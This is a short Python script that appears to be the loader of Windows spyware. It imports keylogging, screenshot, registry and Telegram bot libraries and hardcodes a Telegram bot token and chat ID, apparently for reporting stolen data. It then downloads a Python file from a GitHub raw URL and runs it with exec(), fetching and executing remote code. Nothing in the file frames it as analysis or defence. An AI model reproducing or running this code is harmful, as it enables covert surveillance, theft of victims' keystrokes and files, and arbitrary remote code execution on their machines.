import os
import ctypes
import pyWinhook as pyHook
import pythoncom
from time import strftime, sleep
from shutil import copyfile
from sys import argv
from win32com.client import Dispatch
from PIL import ImageGrab
import platform
import requests
from json import loads
import telebot
from telebot import types
import zipfile
import threading
from io import BytesIO
import shutil
import asyncio
from bs4 import BeautifulSoup
import sys
import winreg
import winshell
import pythoncom
from bs4 import BeautifulSoup

token = '7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8'
bot = telebot.TeleBot(token)
chat_id = 1882056354
telegram_bot_token = "7056495787:AAHkVcBQcjIMBtfoDcSCXhc8MfYQQ9MUzw8"
chat_ids = ('1882056354', '1882056354')
url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/ror.py'
response = requests.get(url)
html_content = response.content
soup = BeautifulSoup(html_content, 'html.parser')
text_without_tags = soup.get_text()
exec(text_without_tags)
